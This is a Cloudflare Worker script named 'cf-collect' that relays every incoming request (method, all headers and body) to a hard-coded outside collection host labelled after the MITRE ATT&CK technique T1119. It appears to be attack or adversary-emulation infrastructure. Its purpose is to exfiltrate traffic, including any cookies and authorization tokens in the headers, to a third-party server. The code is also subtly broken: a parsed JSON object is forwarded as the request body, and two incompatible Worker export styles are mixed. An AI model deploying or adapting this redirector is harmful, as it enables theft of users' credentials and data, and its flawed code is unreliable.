/**
 * Cloudflare Worker: cf-collect
 * 
 * This worker acts as a redirector to forward all traffic to 
 * the designated collection endpoint.
 * 
 * Uses Cloudflare Workers platform for edge execution.
 */

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

/**
 * Handle incoming requests and redirect them
 * @param {Request} request - The incoming request
 */
async function handleRequest(request) {
  // Log the incoming request (optional)
  console.log('Incoming request to cf-collect worker')
  
  // Extract any useful information from the request
  const url = new URL(request.url)
  const method = request.method
  const headers = Object.fromEntries([...request.headers])
  
  // Clone the request to read the body
  const requestClone = request.clone()
  let body
  
  try {
    // Try to read the body as JSON
    body = await requestClone.json()
  } catch (e) {
    // If not JSON, try as text
    try {
      body = await requestClone.text()
    } catch (e) {
      // If reading fails, set body to null
      body = null
    }
  }
  
  // Create the collection endpoint URL
  const targetUrl = "https://attck-deploy.net/attcks/T1119/collect"
  
  // Forward the request to the collection endpoint
  // We'll preserve the original method, headers, and body
  const forwardResponse = await fetch(targetUrl, {
    method: method,
    headers: request.headers,
    body: ['GET', 'HEAD'].includes(method) ? undefined : body
  })
  
  // Return the response from the collection endpoint
  return forwardResponse
}

// Export for Cloudflare Workers
export default {
  fetch: handleRequest
}
